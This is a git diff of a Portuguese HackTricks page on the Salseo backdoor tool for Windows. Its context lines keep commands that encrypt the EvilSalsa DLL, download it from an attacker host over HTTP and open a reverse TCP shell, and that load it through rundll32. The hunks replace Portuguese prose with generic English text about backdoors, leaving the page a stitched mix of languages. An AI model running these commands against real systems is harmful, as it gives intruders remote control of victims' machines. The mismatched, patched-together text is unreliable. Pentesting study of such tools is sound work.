@@ -37,35 +37,31 @@ Antes de tudo, você precisará codificar o **EvilSalsa.dll**. Para fazer isso, 
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-# Backdoors em Windows
+### Windows
 
-Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
+#### Backdoors
 
-## 1. Porta dos fundos do Registro do Windows
+A backdoor is a method of bypassing normal authentication procedures to gain unauthorized access to a computer system. In the context of hacking, backdoors are often used to maintain persistent access to a compromised system.
 
-O Registro do Windows é um banco de dados que armazena configurações e informações importantes do sistema operacional. Um invasor pode criar uma entrada de registro maliciosa que executa um programa ou script sempre que o sistema é iniciado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+#### Salseo
 
-## 2. Backdoors baseados em serviços
+Salseo is a powerful backdoor tool for Windows systems. It provides a wide range of features that allow hackers to gain remote access and control over a compromised system. Salseo can be used to execute commands, upload and download files, manipulate the file system, and even launch other hacking tools.
 
-Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades específicas para o sistema operacional. Um invasor pode criar um serviço malicioso que é executado em segundo plano e fornece acesso remoto ao sistema comprometido. Esse tipo de backdoor é difícil de detectar, pois se disfarça como um serviço legítimo.
+#### Installation
 
-## 3. Backdoors baseados em arquivos executáveis
+To install Salseo on a target Windows system, the hacker needs to first gain initial access to the system. This can be done through various means, such as exploiting vulnerabilities, social engineering, or phishing attacks. Once access is gained, the hacker can proceed with the installation of Salseo.
 
-Um invasor pode modificar um arquivo executável existente no sistema para incluir um código malicioso que permite o acesso remoto. Quando o arquivo é executado, o código malicioso é ativado e o invasor obtém controle sobre o sistema comprometido. Essa técnica é conhecida como "injeção de código" e pode ser usada para criar backdoors em aplicativos legítimos.
+#### Usage
 
-## 4. Backdoors baseados em drivers
+Once installed, Salseo can be controlled remotely by the hacker. The hacker can use a command and control (C2) server to send commands to the compromised system and receive the results. Salseo provides a command-line interface that allows the hacker to execute commands on the compromised system, upload and download files, and perform various other actions.
 
-Os drivers são programas que permitem que o sistema operacional se comunique com dispositivos de hardware. Um invasor pode criar um driver malicioso que é carregado pelo sistema operacional e fornece acesso remoto ao sistema comprometido. Esse tipo de backdoor é particularmente perigoso, pois tem acesso de nível de kernel e pode contornar as medidas de segurança do sistema operacional.
+#### Detection and Prevention
 
-## 5. Backdoors baseados em serviços de terminal
+Detecting and preventing the use of backdoors like Salseo is a challenging task. However, there are some measures that can be taken to minimize the risk. Regularly updating and patching the operating system and software can help prevent vulnerabilities that could be exploited by backdoors. Implementing strong authentication mechanisms and monitoring network traffic can also help in detecting and preventing unauthorized access.
 
-Os serviços de terminal permitem que vários usuários se conectem e interajam com um sistema remotamente. Um invasor pode criar um serviço de terminal malicioso que permite o acesso remoto ao sistema comprometido. Esse tipo de backdoor é difícil de detectar, pois se disfarça como um serviço legítimo de terminal.
+#### Conclusion
 
-## 6. Backdoors baseados em aplicativos de terceiros
-
-Os aplicativos de terceiros são programas desenvolvidos por empresas ou indivíduos que não são os fabricantes do sistema operacional. Um invasor pode explorar vulnerabilidades em um aplicativo de terceiros para criar um backdoor no sistema comprometido. É importante manter todos os aplicativos atualizados para evitar esse tipo de ataque.
-
-Essas são apenas algumas das técnicas usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques de hackers.
+Backdoors like Salseo pose a significant threat to computer systems. It is important for system administrators and users to be aware of the risks and take appropriate measures to protect their systems from unauthorized access. Regular security audits and penetration testing can help identify and mitigate vulnerabilities that could be exploited by backdoors.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -78,7 +74,7 @@ Ok, agora você tem tudo o que precisa para executar todo o processo de Salseo: 
 
 ### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**
 
-Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
+Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -121,13 +117,13 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png>)
 
 #### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
@@ -135,7 +131,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **D**esinstale o DllExport
+### **Desinstale o DllExport**
 
 Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
@@ -145,15 +141,15 @@ Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
 Apenas **saia** do Visual Studio
 
-Em seguida, vá para a sua **pasta SalseoLoader** e **execute o DllExport\_Configure.bat**
+Em seguida, vá para a pasta do seu **SalseoLoader** e **execute o DllExport\_Configure.bat**
 
-Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**
+Selecione **x64** (se você for usá-lo em uma máquina x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro do **Namespace para DllExport**) e pressione **Aplicar**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
 ### **Abra o projeto novamente com o Visual Studio**
 
-**\[DllExport]** não deve mais ser marcado como erro
+**\[DllExport]** não deve mais estar marcado como erro
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
@@ -200,9 +196,7 @@ O CMD pode ser usado para executar comandos básicos, como navegar pelos diretó
 
 Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como obter informações confidenciais, explorar vulnerabilidades, criar backdoors e realizar ataques de força bruta. Portanto, é importante estar ciente das possíveis ameaças e tomar medidas para proteger seu sistema contra ataques.
 
-Para evitar o uso indevido do CMD, é recomendável implementar medidas de segurança, como restringir o acesso ao CMD, monitorar atividades suspeitas e manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
-
-Em resumo, o CMD é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. É essencial entender seu funcionamento e tomar precauções adequadas para garantir a segurança do sistema.
+Para evitar o uso indevido do CMD, é recomendável restringir o acesso ao CMD para usuários não autorizados e implementar medidas de segurança, como firewalls, antivírus e atualizações regulares do sistema operacional. Além disso, é essencial educar os usuários sobre as práticas recomendadas de segurança cibernética e estar atento a atividades suspeitas no sistema.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -215,7 +209,7 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
